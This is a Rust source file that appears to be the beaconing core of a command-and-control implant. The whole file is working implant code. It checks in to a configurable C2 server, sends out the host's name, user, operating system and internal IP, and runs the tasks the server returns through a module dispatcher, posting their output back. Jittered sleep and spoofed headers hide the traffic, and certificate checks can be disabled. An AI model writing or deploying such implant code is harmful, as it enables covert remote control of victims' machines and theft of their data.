use anyhow::{Context, Result};
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::str::FromStr;
use std::time::Duration;

use crate::config::ImplantConfig;
use crate::modules;

#[derive(Serialize)]
struct Checkin {
    session_id:  Option<String>,
    hostname:    String,
    username:    String,
    os:          String,
    arch:        String,
    internal_ip: String,
    profile:     String,
}

#[derive(Deserialize)]
struct CheckinResponse {
    session_id: String,
    tasks:      Vec<Task>,
}

#[derive(Deserialize)]
struct Task {
    task_id: String,
    module:  String,
    args:    Vec<String>,
}

#[derive(Serialize)]
struct TaskResult {
    session_id: String,
    task_id:    String,
    module:     String,
    success:    bool,
    output:     serde_json::Value,
}

pub async fn run(config: ImplantConfig) -> Result<()> {
    let client = build_client(&config)?;
    let mut session_id: Option<String> = None;

    loop {
        let sleep_ms = jittered_sleep(config.sleep_ms, config.jitter_pct);

        match do_checkin(&client, &config, &session_id).await {
            Ok(resp) => {
                session_id = Some(resp.session_id.clone());
                for task in resp.tasks {
                    let (success, output) = modules::dispatch(&task.module, &task.args);
                    let _ = send_result(
                        &client, &config, &resp.session_id,
                        &task.task_id, &task.module, success, output,
                    ).await;
                }
            }
            Err(_) => {}
        }

        tokio::time::sleep(Duration::from_millis(sleep_ms)).await;
    }
}

async fn do_checkin(
    client:     &reqwest::Client,
    config:     &ImplantConfig,
    session_id: &Option<String>,
) -> Result<CheckinResponse> {
    let body = Checkin {
        session_id:  session_id.clone(),
        hostname:    hostname(),
        username:    username(),
        os:          std::env::consts::OS.to_owned(),
        arch:        std::env::consts::ARCH.to_owned(),
        internal_ip: local_ip(),
        profile:     config.profile_name.clone(),
    };
    let url = format!("{}{}", config.c2_base_url, config.checkin_uri);
    client
        .post(&url)
        .headers(build_headers(&config.headers, &config.user_agent))
        .json(&body)
        .send()
        .await
        .context("checkin request failed")?
        .error_for_status()
        .context("server rejected checkin")?
        .json::<CheckinResponse>()
        .await
        .context("failed parsing checkin response")
}

async fn send_result(
    client:     &reqwest::Client,
    config:     &ImplantConfig,
    session_id: &str,
    task_id:    &str,
    module:     &str,
    success:    bool,
    output:     serde_json::Value,
) -> Result<()> {
    let body = TaskResult {
        session_id: session_id.to_owned(),
        task_id:    task_id.to_owned(),
        module:     module.to_owned(),
        success,
        output,
    };
    let url = format!("{}{}", config.c2_base_url, config.result_uri);
    client
        .post(&url)
        .headers(build_headers(&config.headers, &config.user_agent))
        .json(&body)
        .send()
        .await
        .context("result post failed")?
        .error_for_status()
        .context("server rejected result")?;
    Ok(())
}

fn build_client(config: &ImplantConfig) -> Result<reqwest::Client> {
    let mut builder = reqwest::Client::builder().timeout(Duration::from_secs(30));
    if config.accept_invalid_certs {
        builder = builder.danger_accept_invalid_certs(true);
    }
    builder.build().context("failed building HTTP client")
}

fn build_headers(extra: &HashMap<String, String>, user_agent: &str) -> HeaderMap {
    let mut map = HeaderMap::new();
    for (k, v) in extra {
        if let (Ok(name), Ok(val)) = (HeaderName::from_str(k), HeaderValue::from_str(v)) {
            map.insert(name, val);
        }
    }
    if let Ok(ua) = HeaderValue::from_str(user_agent) {
        map.insert("user-agent", ua);
    }
    map
}

fn jittered_sleep(base_ms: u64, jitter_pct: u64) -> u64 {
    if jitter_pct == 0 { return base_ms; }
    let seed = (std::process::id() as u64).wrapping_add(
        std::time::SystemTime::UNIX_EPOCH
            .elapsed()
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0),
    );
    let spread = (base_ms * jitter_pct) / 100;
    base_ms.saturating_add(seed % (spread * 2 + 1)).saturating_sub(spread)
}

fn hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_owned())
}

fn username() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown".to_owned())
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|_| "unknown".to_owned())
}
